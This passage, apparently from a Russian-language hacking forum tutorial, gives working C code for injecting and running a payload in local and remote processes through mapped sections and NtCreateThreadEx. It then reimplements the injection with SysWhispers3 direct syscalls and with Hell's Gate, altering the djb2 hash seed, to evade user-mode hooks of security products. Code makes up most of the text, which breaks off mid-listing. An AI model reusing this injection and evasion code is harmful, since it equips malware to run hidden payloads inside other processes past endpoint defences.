    // –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è - —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Å–µ–∫—Ü–∏–∏
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };
    Syscall                St                    = { 0 };

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039; –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
    if (!InitializeSyscallStruct(&amp;St)) {
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
    if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Local Address At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
    if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Remote Address At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

    // –ó–∞–ø—É—Å–∫ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p In The Remote Process ... &quot;, pRemoteAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    // –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
    if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Å–µ–∫—Ü–∏–∏
    if ((STATUS = St.pNtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
–§—É–Ω–∫—Ü–∏—é NtUnmapViewOfSection —Å–ª–µ–¥—É–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –ü–æ–ø—ã—Ç–∫–∞ –æ—Ç–º–µ–Ω—ã –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –Ω–∞—Ä—É—à–µ–Ω–∏—é –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏–ª–∏ –≤—ã–∑–≤–∞—Ç—å —Å–±–æ–π –ø—Ä–æ—Ü–µ—Å—Å–∞. –í –∫–∞—á–µ—Å—Ç–≤–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtWaitForSingleObject –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞, –ø–æ—Å–ª–µ —á–µ–≥–æ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtUnmapViewOfSection –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –û–¥–Ω–∞–∫–æ —ç—Ç–æ –æ—Å—Ç–∞–µ—Ç—Å—è –Ω–∞ —É—Å–º–æ—Ç—Ä–µ–Ω–∏–µ —á–∏—Ç–∞—Ç–µ–ª—è.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º SysWhispers</b><br />
<br />
–í –¥–∞–Ω–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è SysWhispers3 –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Ö—É–∫–æ–≤ —á–µ—Ä–µ–∑ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã. –î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –¥–ª—è —ç—Ç–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–∞—è –∫–æ–º–∞–Ω–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*</code></pre>
	</div>
</div><br />
–ì–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Ç—Ä–∏ —Ñ–∞–π–ª–∞: SysWhispers.h, SysWhispers.c –∏ SysWhispers-asm.x64.asm.<br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –∏–º–ø–æ—Ä—Ç —ç—Ç–∏—Ö —Ñ–∞–π–ª–æ–≤ –≤ Visual Studio, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –±—ã–ª–æ –≤—ã—à–µ.<br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã —Ñ—É–Ω–∫—Ü–∏–∏ LocalMappingInjectionViaSyscalls –∏ RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –í—ã–¥–µ–ª–µ–Ω –∞–¥—Ä–µ—Å: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------

    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ —Å 0x%p –ø–æ 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    printf(&quot;\t[i] –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ —Å —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);
    printf(&quot;\t[+] –ü–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–Ω —Å ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // –û—Ç–º–µ–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è - —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ä–∞–∑–¥–µ–ª–∞
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] –õ–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ —Å 0x%p –ø–æ 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è
    if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] –£–¥–∞–ª–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    printf(&quot;\t[i] –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ —Å —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ 0x%p ... &quot;, pRemoteAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);
    printf(&quot;\t[+] –ü–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–Ω —Å ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // –û—Ç–º–µ–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è - —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ä–∞–∑–¥–µ–ª–∞
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Hell&#039;s Gate</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω—è—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –¥–ª—è —ç—Ç–æ–≥–æ –º–æ–¥—É–ª—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Hell&#039;s Gate. –í–æ-–ø–µ—Ä–≤—ã—Ö, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è —Ç–µ –∂–µ —à–∞–≥–∏, —á—Ç–æ –∏ –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–µ–∫—Ç–∞ Visual Studio —Å SysWhispers3.<br />
–í —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –≤–∫–ª—é—á–µ–Ω–∏–µ MASM –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–≤–æ–π—Å—Ç–≤ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ–∞–π–ª–∞ ASM –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Microsoft Macro Assembler.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è Seed Value</b><br />
<br />
–ù–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —Å–µ–º–µ–Ω–∏ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">–≤–º–µ—Å—Ç–æ —Å—Ç–∞—Ä–æ–≥–æ</a>, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è djb2 –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è —Å –Ω–æ–≤—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º <b>Seed Value</b>, –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–º –Ω–∏–∂–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // –°—Ç–∞—Ä–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
–¢–µ–ø–µ—Ä—å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–π djb2 –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–π (–ù–∞–ø–∏—à–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞–ø—Ä–∏–º–µ—Ä):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateSection&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtMapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtUnmapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
